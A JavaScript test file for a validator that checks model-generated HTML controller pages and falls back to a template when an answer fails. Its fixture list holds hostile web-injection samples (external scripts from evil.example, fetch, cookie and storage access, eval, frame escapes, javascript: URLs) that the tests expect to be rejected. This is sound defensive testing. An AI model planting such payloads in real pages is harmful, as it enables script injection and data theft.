// Offline tests for astra-html.js: the template, the validator (hostile and benign fixtures) and
// generateControllerHtml with a fake fetch (request shape, fallback on every failure, tier retry, cache, dedupe,
// abort, mock mode). No network, and the real key is never read (OPENAI_API_KEY is set to a dummy first).
//   node dev/v12-modules/test-astra-html.js
process.env.OPENAI_API_KEY = "sk-test-dummy";
delete process.env.ASTRA_MOCK;
delete process.env.ASTRA_HTML_CALL_LOG;
const fs = require("fs");
const path = require("path");
const A = require("../../astra-html.js");
const { _internals: I } = A;

const results = [];
const check = (name, ok, data) => { results.push({ name, ok: !!ok }); console.log(`${ok ? "PASS" : "FAIL"} ${name}${data !== undefined ? " " + JSON.stringify(data) : ""}`); };
const HERE = __dirname;
const corpus = fs.existsSync(path.join(HERE, "corpus/corpus.json")) ? JSON.parse(fs.readFileSync(path.join(HERE, "corpus/corpus.json"), "utf8")) : [];
const BASIC = { buttons: [
  { type: "stick", action: "steer", label: "", x: 0.04, y: 0.35, w: 0.3, h: 0.55 },
  { type: "button", action: "shoot", label: "FIRE", x: 0.74, y: 0.5, w: 0.22, h: 0.36 },
  { type: "button", action: "boost", label: "BOOST", x: 0.5, y: 0.6, w: 0.2, h: 0.3 },
] };
const ALLOWED = ["steer", "shoot", "boost"];
const IMAGE = "data:image/png;base64,iVBORw0KGgo=";

// A benign Sol-style document: SVG namespace URL, url(#id) fills, a .top class, a cosmetic script touching rect.top.
const GOOD = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><style>
:root{color-scheme:dark}.top.left{opacity:.9}.btn{position:absolute;left:84vw;top:65vh;width:max(56px,20vw);height:max(56px,34vh);border:1.5px solid #5ee7ff}
.btn.is-down{transform:scale(.94)}.stick{position:absolute;left:18vw;top:60vh;width:200px;height:200px;border-radius:50%}.knob{position:absolute;left:30%;top:30%;width:40%;height:40%}
</style></head><body>
<div class="stick top left" data-stick="steer"><div class="knob" data-knob></div></div>
<div class="btn" data-action="shoot" data-label="FIRE"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><linearGradient id="g"><stop offset="0" stop-color="#5ee7ff"/></linearGradient></defs><circle cx="12" cy="12" r="6" fill="url(#g)"/><use href="#g"/></svg>FIRE</div>
<div class="btn" data-action="boost" data-label="BOOST" style="left:57vw;background:url(data:image/png;base64,AAAA)">BOOST</div>
<script>const r = document.querySelector(".btn").getBoundingClientRect(); document.querySelector(".btn").style.top = (r.top + 0) + "px"; const parentEl = document.body.parentElement;</script>
</body></html>`;

const bad = (snippet, where = "script") => where === "script"
  ? GOOD.replace("</body>", `<script>${snippet}</script></body>`)
  : GOOD.replace("</body>", `${snippet}</body>`);
const HOSTILE = [
  ["<script src>", bad('<script src="https://evil.example/x.js"></script>', "markup"), "<script src>"],
  ["fetch", bad("fetch('/x')"), "fetch"],
  ["fetch by reference", bad("const f = fetch; f('/x')"), "fetch"],
  ["Reflect", bad("Reflect.get(window, 'x')"), "Reflect"],
  ["defaultView", bad("document.defaultView.parent.postMessage({}, '*')"), "defaultView"],
  ["svg script", bad('<svg><script>fetch("/x")</script></svg>', "markup"), "fetch"],
  ["img onerror", bad('<img src="data:image/png;base64,AA" onerror="x()">', "markup"), "inline event handler"],
  ["svg image href", bad('<svg><image href="//evil.example/p.png"/></svg>', "markup"), 'href="//evil'],
  ["base tag", bad('<base href="https://evil.example/">', "markup"), "<base>"],
  ["XMLHttpRequest", bad("new XMLHttpRequest()"), "XMLHttpRequest"],
  ["WebSocket", bad("new WebSocket('ws://x')"), "WebSocket"],
  ["import()", bad("import('./x.js')"), "import()"],
  ["localStorage", bad("localStorage.x = 1"), "localStorage"],
  ["document.cookie", bad("document.cookie = 'a=b'"), "cookie"],
  ["top.", bad("top.location = '#'"), "top."],
  ["parent.", bad("parent.postMessage({}, '*')"), "parent."],
  ["window.parent", bad("window.parent.x = 1"), "window escape"],
  ["eval", bad("eval('1')"), "eval"],
  ["location", bad("location.href = 'https://x'"), "location"],
  ["sendBeacon", bad("navigator.sendBeacon('/x')"), "navigator"],
  ["dynamic global", bad("window['fe' + 'tch']('/x')"), "dynamic global"],
  ["fromCharCode", bad("String.fromCharCode(102)"), "obfuscation"],
  ["input handler", bad("document.body.addEventListener('pointerdown', () => {})"), "input handler"],
  ["script creates controls", bad("document.body.insertAdjacentHTML('beforeend', '<div data-action=\"nuke\"></div>')"), "script creates controls"],
  ["game.press dynamic", bad("const a = 'shoot'; game.press(a)"), "computed action"],
  ["game.press nuke", bad("game.press('nuke')"), "not allowed"],
  ["onclick attribute", GOOD.replace('data-label="FIRE"', 'data-label="FIRE" onclick="x()"'), "inline event handler"],
  ["<iframe>", bad('<iframe src="about:blank"></iframe>', "markup"), "<iframe>"],
  ["<link>", bad('<link rel="stylesheet" href="https://x/y.css">', "markup"), "<link>"],
  ["<form>", bad('<form><input name="a"></form>', "markup"), "<form>"],
  ["meta refresh", GOOD.replace("<meta charset", '<meta http-equiv="refresh" content="0;url=https://x"><meta charset'), "http-equiv"],
  ["img http", bad('<img src="https://evil.example/p.png">', "markup"), 'src="https'],
  ["css url", GOOD.replace(".top.left{opacity:.9}", ".top.left{background:url(https://evil.example/b.png)}"), "css url"],
  ["css @import", GOOD.replace(":root{", "@import 'x.css';:root{"), "@import"],
  ["javascript: url", bad('<a href="javascript:alert(1)">x</a>', "markup"), "script URL"],
  ["network URL text", bad("<p>see http://evil.example</p>", "markup"), "network URL"],
  ["unknown action", GOOD.replace('data-action="boost"', 'data-action="nuke"'), "not allowed"],
  ["stick as data-action", GOOD.replace('data-stick="steer"', 'data-action="steer"'), "must be a data-stick"],
  ["missing control", GOOD.replace('data-action="boost" data-label="BOOST"', 'data-label="BOOST"'), "missing control: boost"],
  ["unclosed script", GOOD.replace("</body>", "<script>let a = 1;</body>"), "unclosed <script>"],
  ["too large", GOOD.replace("</body>", `<!-- pad --><p>${"x".repeat(61 * 1024)}</p></body>`), "too large"],
];

async function main() {
  // ---- Template ----
  const layouts = [BASIC, ...corpus.map((d) => d.layout)];
  let allOk = true, maxBytes = 0;
  for (const layout of layouts) {
    const html = A.templateHtml(layout);
    const v = A.validateHtml(html, { layout });
    allOk = allOk && v.ok && html === A.templateHtml(layout) && v.controls.length === layout.buttons.length;
    maxBytes = Math.max(maxBytes, v.bytes);
    if (!v.ok) console.log("  template errors:", v.errors);
  }
  const t0 = process.hrtime.bigint();
  for (let i = 0; i < 200; i++) A.templateHtml(layouts[i % layouts.length]);
  const avgMs = Number(process.hrtime.bigint() - t0) / 1e6 / 200;
  check("template: valid, deterministic, one control per drawn control, for every corpus layout", allOk, { layouts: layouts.length, maxBytes, avgMs: +avgMs.toFixed(3) });
  const sub = A.templateHtml(BASIC, { allowedActions: ["steer", "shoot"] });
  check("template: controls whose action is not allowed are left out", !/data-action="boost"/.test(sub) && /data-action="shoot"/.test(sub));
  check("template: accent colour applied, bad colours ignored", /--k:#ff00aa/.test(A.templateHtml(BASIC, { style: { accent: "#FF00AA" } })) && /--k:#2f8bff/.test(A.templateHtml(BASIC, { style: { accent: "red;}</style><script>" } })));

  // ---- Validator ----
  const good = A.validateHtml(GOOD, { allowedActions: ALLOWED, layout: BASIC });
  check("validator: benign Sol-style document accepted (svg namespace, url(#id), .top class, rect.top)", good.ok, good.errors);
  let hostileOk = 0;
  for (const [name, html, expect] of HOSTILE) {
    const v = A.validateHtml(html, { allowedActions: ALLOWED, layout: BASIC });
    const hit = !v.ok && v.errors.some((e) => e.includes(expect));
    if (hit) hostileOk++;
    else console.log(`  MISSED ${name}: ok=${v.ok} errors=${JSON.stringify(v.errors)}`);
  }
  check(`validator: ${HOSTILE.length} hostile fixtures rejected with the right reason`, hostileOk === HOSTILE.length, { rejected: hostileOk, of: HOSTILE.length });
  const realOk = [], realBad = [];
  for (const d of corpus) {
    const file = path.join(HERE, "corpus/out", `${d.name}.html`);
    if (!fs.existsSync(file)) continue;
    const v = A.validateHtml(fs.readFileSync(file, "utf8"), { layout: d.layout });
    (v.ok ? realOk : realBad).push(v.ok ? d.name : `${d.name}: ${v.errors.join("; ")}`);
  }
  if (realOk.length || realBad.length) check("validator: every real Sol answer in corpus/out accepted (no false positives)", !realBad.length, { accepted: realOk.length, rejected: realBad });

  // ---- generateControllerHtml with a fake fetch ----
  const requests = [];
  const answer = (text, extra = {}) => ({ ok: true, status: 200, json: async () => ({ status: "completed", output: [{ type: "message", content: [{ type: "output_text", text }] }], usage: { input_tokens: 1000, output_tokens: 1500 }, ...extra }), text: async () => "" });
  let reply = () => answer(GOOD);
  I.setFetch(async (url, init) => { requests.push({ url, body: JSON.parse(init.body), signal: init.signal }); return reply(init); });
  const gen = (o = {}) => A.generateControllerHtml({ image: IMAGE, layout: BASIC, allowedActions: ALLOWED, ...o });

  I.reset(); requests.length = 0;
  let r = await gen();
  const body = requests[0] && requests[0].body;
  check("model: valid answer used (source model), controls listed", r.ok && r.source === "model" && r.controls.length === 3 && r.html === GOOD, { source: r.source, controls: r.controls.length });
  check("request: gpt-6.1-sol, ultrafast, effort low, image detail low, instructions, store false, layout centres", body && body.model === "gpt-6.1-sol" && body.service_tier === "ultrafast" && body.reasoning.effort === "low" && body.store === false &&
    body.input[0].content.some((c) => c.type === "input_image" && c.detail === "low") && /SPACE PARTY/.test(body.instructions) && /centre 19vw 62.5vh/.test(body.input[0].content[0].text), { max_output_tokens: body && body.max_output_tokens });
  requests.length = 0;
  r = await gen();
  check("cache: the same drawing and layout answer at once without a call", r.source === "model" && requests.length === 0 && r.ms < 20, { ms: r.ms });

  const fallbackCase = async (name, fn, expect, o = {}) => {
    I.reset(); requests.length = 0; reply = fn;
    const res = await gen(o);
    const ok = res.ok && res.source === "template" && String(res.error).includes(expect) && A.validateHtml(res.html, { layout: BASIC }).ok;
    check(`fallback: ${name} → template (${expect})`, ok, { error: res.error, calls: requests.length });
  };
  await fallbackCase("hostile answer", () => answer(bad("fetch('/x')")), "rejected: script uses fetch");
  await fallbackCase("answer missing a drawn control", () => answer(GOOD.replace('data-action="boost" ', "")), "missing control: boost");
  await fallbackCase("HTTP 500", () => ({ ok: false, status: 500, text: async () => "boom", json: async () => ({}) }), "OpenAI HTTP 500");
  await fallbackCase("incomplete (max tokens)", () => answer(GOOD.slice(0, 500), { status: "incomplete", incomplete_details: { reason: "max_output_tokens" } }), "incomplete");
  await fallbackCase("refusal", () => ({ ok: true, status: 200, json: async () => ({ output: [{ content: [{ type: "refusal", refusal: "no" }] }] }), text: async () => "" }), "model refused");
  await fallbackCase("not HTML", () => answer("Sure! Here is your controller."), "no HTML document");
  I.reset(); I.setTimeoutMs(60); requests.length = 0;
  reply = (init) => new Promise((resolve, reject) => init.signal.addEventListener("abort", () => reject(new Error("aborted"))));
  r = await gen();
  check("fallback: no answer within the timeout → template (timeout)", r.source === "template" && r.error === "timeout" && r.ms < 400, { ms: r.ms });

  I.reset(); requests.length = 0;
  reply = () => answer("```html\n" + GOOD + "\n```\nEnjoy!");
  r = await gen();
  check("markdown fences around the document are stripped", r.source === "model" && r.html === GOOD);

  I.reset(); requests.length = 0;
  let n = 0;
  reply = () => (++n === 1 ? { ok: false, status: 400, text: async () => '{"error":{"message":"Unsupported service_tier for image input"}}', json: async () => ({}) } : answer(GOOD));
  r = await gen();
  check("tier rejected → retried once on the default tier, remembered", r.source === "model" && requests.length === 2 && requests[0].body.service_tier === "ultrafast" && !("service_tier" in requests[1].body) && I.state().defaultTierOnly, { calls: requests.length });

  I.reset(); requests.length = 0;
  let release;
  reply = () => new Promise((resolve) => (release = () => resolve(answer(GOOD))));
  const p1 = gen(), p2 = gen();
  await new Promise((res) => setTimeout(res, 20));
  release();
  const [a, b] = await Promise.all([p1, p2]);
  check("in-flight dedupe: two identical calls share one request", requests.length === 1 && a.source === "model" && b.source === "model");

  I.reset(); requests.length = 0;
  reply = (init) => new Promise((resolve, reject) => init.signal.addEventListener("abort", () => reject(new Error("aborted"))));
  const ac = new AbortController();
  const pa = gen({ signal: ac.signal });
  await new Promise((res) => setTimeout(res, 20));
  ac.abort();
  r = await pa;
  await new Promise((res) => setTimeout(res, 20));
  check("abort: the caller gets the template at once and the request is cancelled", r.source === "template" && r.error === "aborted" && requests[0].signal.aborted);

  I.reset(); requests.length = 0;
  process.env.ASTRA_MOCK = "1";
  r = await gen();
  delete process.env.ASTRA_MOCK;
  check("ASTRA_MOCK=1: template, no network", r.source === "template" && r.error === "mock" && requests.length === 0);

  r = await A.generateControllerHtml({ layout: { buttons: [] } });
  const r2 = await A.generateControllerHtml({ layout: BASIC, allowedActions: ["dig"] });
  check("no usable control → ok:false with a reason", !r.ok && !r2.ok && /no allowed controls/.test(r2.error), { error: r.error, error2: r2.error });

  I.reset(); requests.length = 0; reply = () => answer(GOOD);
  r = await A.generateControllerHtml({ layout: BASIC, allowedActions: ALLOWED });
  check("no image: still one call, layout only", r.source === "model" && !requests[0].body.input[0].content.some((c) => c.type === "input_image"));

  const pass = results.every((x) => x.ok);
  console.log(`\n${pass ? "ALL PASS" : "FAILED"}: ${results.filter((x) => x.ok).length}/${results.length}`);
  process.exit(pass ? 0 : 1);
}
main().catch((e) => { console.error(e); process.exit(1); });
